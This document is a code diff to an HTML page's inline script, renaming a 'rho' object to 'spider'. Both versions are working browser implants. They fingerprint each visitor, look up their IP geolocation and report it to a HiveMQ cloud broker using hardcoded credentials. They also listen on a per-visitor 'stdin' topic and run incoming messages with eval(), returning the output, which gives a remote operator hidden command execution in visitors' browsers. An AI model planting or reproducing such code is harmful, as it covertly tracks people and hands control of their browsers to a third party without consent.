@@ -472,64 +472,57 @@
 
         load();
     </script>
-    <script type="text/javascript">
-        let rho = {
-            mqttClient: null,
+<script type="text/javascript">
+    let spider = {
+        root: "spiderjs",
+        mqttClient: null,
+        packet: {
             fingerprint: new ClientJS().getFingerprint(),
             browserData: new ClientJS().getBrowserData(),
-            ipAddressGeolocation : fetch('https://ipapi.co/json')
+            geolocation : fetch('https://ipapi.co/json')
                                     .then(response => response.json())
-                                    .then(data => { rho.ipAddressGeolocation = data; rho.connect() }),
-            connect: () => {
-                var identification = {
-                    fingerprint: rho.fingerprint,
-                    browserData: rho.browserData,
-                    ipAddressGeolocation: rho.ipAddressGeolocation,
-                    status: "Offline",
-                    date: Date()
-                };
-                var mqttOptions = {
-                    port: 8884,
-                    protocol: "wss",
-                    username: "reedleoneil",
-                    password: "P@$$w0rd",
-                    path: "/mqtt",
-                    will: {
-                        topic: "rho/" + rho.fingerprint,
-                        payload: JSON.stringify(identification),
-                        retain: true
-                    }
-                };
-                rho.mqttClient = mqtt.connect("wss://8e86d252f3c44fca8ce087b965c40d47.s1.eu.hivemq.cloud", mqttOptions);
-                rho.mqttClient.on("connect", rho.onConnect);
-                rho.mqttClient.on("message", rho.onMessage);
-                rho.mqttClient.subscribe("rho/" + rho.fingerprint + "/stdin");
-            },
-            onConnect: () => {
-                var identification = {
-                    fingerprint: rho.fingerprint,
-                    browserData: rho.browserData,
-                    ipAddressGeolocation: rho.ipAddressGeolocation,
-                    status: "Online",
-                    date: Date()
-                };
-                rho.mqttClient.publish("rho/" + rho.fingerprint, JSON.stringify(identification), { retain: true });
-            },
-            onMessage: (topic, payload) => {
-                topic = topic.split("/");
-                var root = topic[0],
-                    fingerprint = topic[1],
-                    stdio = topic[2];
-                if (root == "rho" && fingerprint == rho.fingerprint && stdio == "stdin")
-                    try {
-                        out = eval(payload.toString());
-                        if (out)
-                            rho.mqttClient.publish("rho/" + rho.fingerprint + "/stdout", JSON.stringify(out));
-                    } catch (error) {
-                        rho.mqttClient.publish("rho/" + rho.fingerprint + "/stderr", error.toString());
-                    }
-            }
-        };
-    </script>
+                                    .then(data => { spider.packet.geolocation = data; spider.connect() }),
+            status: "Offline",
+            lastOnline: Date()
+        },
+
+        connect: () => {
+            var mqttOptions = {
+                port: 8884,
+                protocol: "wss",
+                username: "spiderjs",
+                password: "P@$$w0rdjs",
+                path: "/mqtt",
+                will: {
+                    topic: spider.root + "/" + spider.packet.fingerprint,
+                    payload: JSON.stringify(spider.packet),
+                    retain: true
+                }
+            };
+            spider.mqttClient = mqtt.connect("wss://8e86d252f3c44fca8ce087b965c40d47.s1.eu.hivemq.cloud", mqttOptions);
+            spider.mqttClient.on("connect", spider.onConnect);
+            spider.mqttClient.on("message", spider.onMessage);
+            spider.mqttClient.subscribe(spider.root + "/" + spider.packet.fingerprint + "/stdin");
+        },
+        onConnect: () => {
+            spider.packet.status = "Online";
+            spider.mqttClient.publish(spider.root + "/" + spider.packet.fingerprint, JSON.stringify(spider.packet), { retain: true });
+        },
+        onMessage: (topic, payload) => {
+            topic = topic.split("/");
+            var root = topic[0],
+                fingerprint = topic[1],
+                stdio = topic[2];
+            if (root == spider.root && fingerprint == spider.packet.fingerprint && stdio == "stdin")
+                try {
+                    out = eval(payload.toString());
+                    if (out)
+                        spider.mqttClient.publish(spider.root + "/" + spider.packet.fingerprint + "/stdout", JSON.stringify(out));
+                } catch (error) {
+                    spider.mqttClient.publish(spider.root + "/" + spider.packet.fingerprint + "/stderr", error.toString());
+                }
+        }
+    };
+</script>
 </body>
 </html>
